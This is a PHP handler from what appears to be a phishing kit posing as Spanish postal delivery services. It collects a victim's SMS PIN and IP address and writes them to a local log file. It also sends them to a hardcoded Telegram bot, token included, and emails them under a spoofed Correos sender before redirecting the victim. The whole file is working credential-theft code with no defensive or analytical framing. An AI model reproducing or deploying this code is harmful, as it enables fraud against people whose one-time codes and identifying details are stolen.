<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['_np_code']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['']=$_POST[''];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message = "Pin :" . $_POST['_np_code'] . "\n" . $ip . "\n===🇪🇸🇪🇸🇪🇸🇪🇸==Yamamoto==🇪🇸🇪🇸🇪🇸🇪🇸===\n";
            $file = fopen("./Coret_sms.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "====🇪🇸🇪🇸🇪🇸🇪🇸==Pin==🇪🇸🇪🇸🇪🇸🇪🇸==== :";
			$tok="5660525013:AAEot5zekNl6nOEZNbDsbmryXok3t2-X3_4";
            $user="-833585281";
            $request=[
              'chat_id' => $user,
              'text' => $subject."
            ".$message
            ];
            $request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
            file_get_contents($request_url);
			$headers = "From:Info <Chronopost@correos.es>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
			
			
        header("Location: ./Y2/Detalle_b.html?codigo_id=".md5($_GET['error']));
    }
}
?>